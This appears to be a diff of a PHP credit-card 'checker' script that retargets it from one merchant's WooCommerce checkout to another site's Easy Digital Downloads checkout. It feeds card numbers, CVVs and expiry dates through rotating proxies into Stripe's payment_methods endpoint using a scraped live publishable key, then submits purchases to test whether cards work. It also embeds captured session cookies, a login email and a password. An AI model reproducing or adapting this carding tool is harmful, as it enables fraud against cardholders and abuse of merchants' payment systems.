@@ -1,10 +1,5 @@
 <?php
 
-#---------------------------------------------------------------------------------------------------------------------------------#
-#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
-#---------------------------------------------------------------------------------------------------------------------------------#
- 
-
 require 'function.php';
 
 error_reporting(0);
@@ -112,13 +107,13 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
 'method: POST',
-'path: /v1/sources',
+'path: /v1/payment_methods',
 'scheme: https',
 'accept: application/json',
 'accept-language: en-US,en;q=0.9',
@@ -139,7 +134,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&owner[address][country]=US&owner[email]='.$email.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d5d641d1-8763-493b-b1a9-f4e909c63e0bcc0c50&muid=0ff126ff-f5d1-4919-b2c0-e4e3f54d3a73ffc77e&sid=066bbf43-c2b8-44d6-9b33-460441287327c5697f&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=37299&key=pk_live_MDKbnWw3SeuL7D2ajui5ONao');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d5d641d1-8763-493b-b1a9-f4e909c63e0bcc0c50&muid=bbaca2d9-12de-42dd-b0bc-9c27943a8cda6e9067&sid=43fd6a58-1716-45df-8d5e-2c0d0efc6b27f8cd9e&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=130742&key=pk_live_515nZbAAufgDOIdEHyaWaOidCe5ySx7P57Lv5PPcsa56n7tWbzZE2hcy39gKhgn3Rc5eH6d6tPtr4DWHP7WbqdR0w00QyCTOpZp');
 
 
 
@@ -151,7 +146,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://themes.getbootstrap.com/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://wpsimplepay.com/wp-admin/admin-ajax.php');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -162,16 +157,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: themes.getbootstrap.com',
+'authority: wpsimplepay.com',
 'method: POST',
-'path: /?wc-ajax=checkout',
+'path: /wp-admin/admin-ajax.php',
 'scheme: https',
 'accept: application/json, text/javascript, */*; q=0.01',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-//'cookie: mailchimp_landing_site=https://themes.getbootstrap.com/?wc-ajax=get_refreshed_fragments; woocommerce_items_in_cart=1; woocommerce_cart_hash=421b08f597948d2576ed3bc4ad8e7d99; wp_woocommerce_session_f4de320e4a50802cee59045ae887e021=90ab81a7aeb54df624ae91c6229d1b41||1649270084||1649266484||b123767c253ca1d01e3a182ea65fce20; __stripe_mid=0ff126ff-f5d1-4919-b2c0-e4e3f54d3a73ffc77e; __stripe_sid=066bbf43-c2b8-44d6-9b33-460441287327c5697f; mailchimp.cart.current_email=Info@tablig.net; tk_ai=woo:uOP1AEhnas0oJhZ9x9G+x/UG; mailchimp_user_email=Info@tablig.net',
-'origin: https://themes.getbootstrap.com',
-'referer: https://themes.getbootstrap.com/checkout/',
+//'cookie: wordpress_sec_d7a96d427c97e2d0904b7a9e254433af=Info3@tablig.net|1649284097|4XNZxNYlrY4UK0ll2lS5ZiS2zuAT2tXX52ZIxhmdjTq|b9d7f82eb39e42ebc7c4571b21b0b73a63501a9ab275d437b9fea304eae1e5c5; GCLB=CPnzg9CL7MbnUg; PHPSESSID=04hg2d91g10299rdifd7iael38; pixelcat_id=24f8c4ff30; __stripe_mid=bbaca2d9-12de-42dd-b0bc-9c27943a8cda6e9067; __stripe_sid=43fd6a58-1716-45df-8d5e-2c0d0efc6b27f8cd9e; edd_items_in_cart=1; wordpress_logged_in_d7a96d427c97e2d0904b7a9e254433af=Info3@tablig.net|1649284097|4XNZxNYlrY4UK0ll2lS5ZiS2zuAT2tXX52ZIxhmdjTq|5bd25aa420fd927977386c232ac8aa3406ef9275fe708a6a33008fcc34212c35',
+'origin: https://wpsimplepay.com',
+'referer: https://wpsimplepay.com/checkout/?discount=SAVE50',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -180,7 +175,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method=stripe&_wpnonce=a72428fc3b&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company=&billing_country=US&billing_email='.$email.'&account_password=&stripe_source='.$id.'');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'action=edds_process_purchase_form&form_data=edd_email%3DInfo3%2540tablig.net%26edd_phone%3D12024087524%26phone%3D%26edd_first%3DJhon%26edd_last%3DJaox%26edd_user_login%3DInfo3%2540tablig.net%26edd_user_pass%3DHasan%2540%25234455%26edd_user_pass_confirm%3DHasan%2540%25234455%26edd_login_nonce%3Df32ef14b74%26payment-mode%3Dstripe%26card_name%3Djhon%2520mdke%26edd_action%3Dpurchase%26edd-gateway%3Dstripe%26edd-process-checkout-nonce%3D512b92513c%26edd-purchase-var%3Dneeds-to-register&payment_method_id='.$id.'&payment_method_exists=false');
 
 
 $result2 = curl_exec($ch);
@@ -446,9 +441,5 @@ ob_flush();
 
 echo "<b>Result:</b> $result1<br><br>";
 echo "<b>Result:</b> $result2<br><br>";
-
-#---------------------------------------------------------------------------------------------------------------------------------#
-#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
-#---------------------------------------------------------------------------------------------------------------------------------#
 
 ?>
